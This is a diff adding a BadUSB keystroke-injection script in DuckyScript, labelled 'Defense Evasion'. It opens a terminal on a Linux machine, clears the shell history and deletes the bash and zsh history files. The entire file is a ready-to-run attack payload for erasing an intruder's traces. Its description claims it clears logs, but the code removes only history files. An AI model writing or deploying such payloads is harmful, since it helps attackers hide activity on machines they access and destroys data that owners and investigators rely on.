@@ -1,0 +1,30 @@
+REM Title: Linux History Cleaner
+REM Author: BadUSB Library
+REM Description: Clears command history and logs
+REM Target: Linux
+REM Category: Defense Evasion
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Clear history
+STRING history -c
+ENTER
+DELAY 500
+
+STRING rm -f ~/.bash_history
+ENTER
+DELAY 500
+
+STRING rm -f ~/.zsh_history
+ENTER
+DELAY 500
+
+STRING clear
+ENTER
